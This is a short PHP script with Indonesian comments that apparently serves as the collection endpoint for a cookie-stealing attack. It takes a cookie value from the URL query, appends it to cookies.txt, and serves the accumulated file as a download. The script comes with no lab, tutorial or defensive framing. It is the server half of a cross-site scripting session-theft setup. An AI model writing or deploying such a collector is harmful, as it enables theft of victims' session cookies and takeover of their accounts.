<?php
  $cookie = $_GET['cookie'];  // Menerima cookie dari URL
  $file = 'cookies.txt';      // Simpan di file teks

  // Simpan cookie ke file
  file_put_contents($file, $cookie . PHP_EOL, FILE_APPEND);

  // Pilihan: Unduh file setelah cookie diterima (kalau ini tujuan akhir)
  header('Content-Type: application/octet-stream');
  header('Content-Disposition: attachment; filename="cookies.txt"');
  readfile($file);
?>
